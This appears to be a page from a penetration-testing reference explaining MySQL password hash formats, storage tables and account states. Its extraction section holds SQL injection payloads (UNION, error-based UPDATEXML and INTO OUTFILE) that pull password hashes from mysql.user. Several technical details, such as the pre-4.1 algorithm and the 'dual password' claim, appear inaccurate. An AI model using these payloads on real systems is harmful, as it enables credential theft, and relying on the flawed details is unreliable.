---
title: Password Hashing
description: Understanding MySQL password hashing algorithms and formats
category: Authentication
order: 23
tags: ["password hashing", "authentication", "security"]
lastUpdated: 2025-03-15
---

## Password Hashing

MySQL uses different password hashing algorithms depending on the version. Understanding these algorithms is important during SQL injection attacks when attempting to extract and potentially crack user passwords.

### MySQL Password Hash Evolution

| MySQL Version | Hash Algorithm        | Hash Length | Format                            |
| ------------- | --------------------- | ----------- | --------------------------------- |
| Pre-4.1       | Hash()                | 16 bytes    | Hex string (16 chars)             |
| 4.1 to 5.6    | SHA1(SHA1())          | 20 bytes    | '\*' + Hex string (41 chars)      |
| 5.7+          | Native Authentication | 20 bytes    | '\*' + Hex string (41 chars)      |
| 8.0+          | caching_sha2_password | SHA-256     | '$A$005$' + mixed case (60 chars) |

### MySQL Old Password Algorithm (Pre-4.1)

The old password algorithm used before MySQL 4.1 is a simple 16-byte hash:

```sql
-- Example pre-4.1 password hash for 'password'
SELECT OLD_PASSWORD('password'); -- Returns '5d2e19393cc5ef67'
```

The algorithm:

1. Take the first 8 bytes of SHA1(password)
2. Perform a specific folding operation
3. Convert to a 16-character hex string

### MySQL Standard Password Algorithm (4.1 to 5.6)

The more secure password algorithm introduced in MySQL 4.1:

```sql
-- Example standard password hash for 'password'
SELECT PASSWORD('password'); -- Returns '*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19'
```

The algorithm:

1. Calculate SHA1(password) = hash1
2. Calculate SHA1(hash1) = hash2
3. Return '\*' + UPPERCASE(HEX(hash2))

### Where Password Hashes Are Stored

MySQL stores password hashes in system tables:

```sql
-- MySQL 5.7 and earlier
SELECT User, Host, Password FROM mysql.user;

-- MySQL 8.0+
SELECT User, Host, authentication_string FROM mysql.user;
```

### Extracting Password Hashes

When exploiting SQL injection vulnerabilities, password hashes can be obtained:

```sql
-- Via UNION attack
' UNION SELECT User, Password, 3 FROM mysql.user -- -

-- Via error-based extraction
' AND UPDATEXML(1,CONCAT('~',(SELECT Password FROM mysql.user WHERE User='root' LIMIT 1),'~'),1) -- -

-- Via outfile (requires FILE privilege)
' UNION SELECT User, Password, 3 FROM mysql.user INTO OUTFILE '/tmp/hashes.txt' -- -
```

### Password Hash Formats Examples

```
-- Pre-4.1 hash for 'password'
5d2e19393cc5ef67

-- MySQL 4.1+ hash for 'password'
*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19

-- MySQL 8.0+ caching_sha2_password for 'password' (example)
$A$005$XKK#jY,d89Z0s8Xn1n8.8OaGl7NJ2fmWJKiLZ78XDOXbGXOX0d4InvT2
```

### Special Password Values

MySQL uses special values for certain account states:

```
-- Empty string: User can connect without password
''

-- MySQL 5.7 and earlier - No password / invalid account:
NULL

-- MySQL pre-4.1 - Account locked:
'*LK*'

-- MySQL 4.1+ - Account locked:
'*THISISNOTAVALIDPASSWORDHASH*'
```

### Dual Password Mechanism

From MySQL 5.6+, the server can maintain both old and new format hashes:

```sql
-- Check if system uses dual passwords
SHOW VARIABLES LIKE 'old_passwords';
```

### Functions to Generate Password Hashes

MySQL provides functions to create password hashes:

```sql
-- Pre-4.1 hash (deprecated)
SELECT OLD_PASSWORD('mypassword');

-- 4.1+ hash (deprecated in 5.7+)
SELECT PASSWORD('mypassword');
```

In MySQL 8.0+, direct password hashing functions are removed for security reasons.

### Creating User with Password

```sql
-- MySQL 5.7 and earlier
CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';
-- Or with direct hash
CREATE USER 'username'@'localhost' IDENTIFIED BY PASSWORD '*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19';

-- MySQL 8.0+
CREATE USER 'username'@'localhost' IDENTIFIED WITH 'mysql_native_password' BY 'password';
-- Alternatively with auth_string
CREATE USER 'username'@'localhost' IDENTIFIED WITH 'mysql_native_password' AS '*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19';
```

### Password Hash Security Considerations

1. Pre-4.1 hashes are considered insecure and can be cracked easily
2. 4.1+ SHA1 hashes are stronger but still vulnerable to rainbow tables
3. MySQL 8.0's caching_sha2_password is significantly more secure
4. Some MySQL server configurations may still allow legacy authentication

### Notes for Penetration Testers

- Password policies are not enforced at the database level in MySQL 5.7 and earlier
- Password hashes can be transferred between servers of the same version
- Users with INSERT privilege on mysql.user can potentially add new users
- Password history is not tracked by default
- Some apps store passwords in their own tables, often with weaker hashing
